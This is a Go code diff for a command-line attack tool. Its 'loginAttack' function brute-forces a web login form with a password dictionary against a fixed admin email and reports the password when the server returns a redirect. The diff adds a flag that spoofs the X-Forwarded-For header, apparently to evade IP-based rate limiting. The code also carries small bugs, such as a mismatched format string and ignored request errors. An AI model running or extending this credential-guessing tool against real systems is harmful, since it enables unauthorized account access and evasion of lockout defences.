@@ -7,10 +7,19 @@ import (
 	"flag"
 	"net/url"
 	"bufio"
+	"bytes"
 )
 
-func ping(target string) {
-	fmt.Printf("Pinging %s ...", target)
+type Options struct {
+	Host string
+	Port int
+	Uri  string
+	From string
+}
+
+func ping(options *Options) {
+	target := fmt.Sprintf("http://%s:%d", options.Host, options.Port)
+	fmt.Printf("Pinging %s:%d ...", target)
 	response, err := http.Get(target)
 
 	if err != nil {
@@ -22,8 +31,9 @@ func ping(target string) {
 	}
 }
 
-func loginAttack(target string, uri string) {
-	endpoint := fmt.Sprintf("%s%s", target, uri)
+func loginAttack(options *Options) {
+	target := fmt.Sprintf("http://%s:%d", options.Host, options.Port)
+	endpoint := fmt.Sprintf("%s%s", target, options.Uri)
 	fmt.Println("Starting login attack on", endpoint)
 
 	file, err := os.Open("dictionary.txt")
@@ -43,11 +53,14 @@ func loginAttack(target string, uri string) {
 		data.Set("inputEmail", "admin@example.com")
 		data.Set("inputPassword", password)
 
-		response, err := http.PostForm(endpoint, data)
-		if err != nil {
-			fmt.Println(err)
+		client := &http.Client{}
+		request, _ := http.NewRequest("POST", endpoint, bytes.NewBufferString(data.Encode()))
+		if options.From != "" {
+			request.Header.Add("X-Forwarded-For", options.From)
 		}
+		response, _ := client.Do(request)
 		defer response.Body.Close()
+
 		fmt.Println(response.Status)
 		if (response.StatusCode == 302) {
 			fmt.Println("The password is:", password)
@@ -57,30 +70,44 @@ func loginAttack(target string, uri string) {
 
 func main() {
 	pingPtr := flag.Bool("ping", false, "Test to see if a host is available")
-
 	hostPtr := flag.String("host", "", "Set the host")
 	portPtr := flag.Int("port", 80, "Set the port")
+	fromPtr := flag.String("from", "", "Set the X-Forwarded-For header")
 
 	loginAttackPtr := flag.String("loginAttack", "", "Hit the login endpoint of an application")
 
 	flag.Parse()
 
-	var target string
+	options := new(Options)
 
-	if (*hostPtr != "" && *portPtr != 0) {
-		target = fmt.Sprintf("http://%s:%d", *hostPtr, *portPtr)
-	} else {
+	if *hostPtr != "" {
+		options.Host = *hostPtr
+	}
+
+	if *portPtr != 0 {
+		options.Port = *portPtr
+	}
+
+	if *loginAttackPtr != "" {
+		options.Uri = *loginAttackPtr
+	}
+
+	if *fromPtr != "" {
+		options.From = *fromPtr
+	}
+
+	if (options.Host == "" && options.Port == 0) {
 		fmt.Println("Must supply a host and port")
 		os.Exit(1)
 	}
 
 	if (*pingPtr == true) {
-		ping(target)
+		ping(options)
 		os.Exit(0)
 	}
 
 	if (*loginAttackPtr != "") {
-		loginAttack(target, *loginAttackPtr)
+		loginAttack(options)
 		os.Exit(0)
 	}
 }
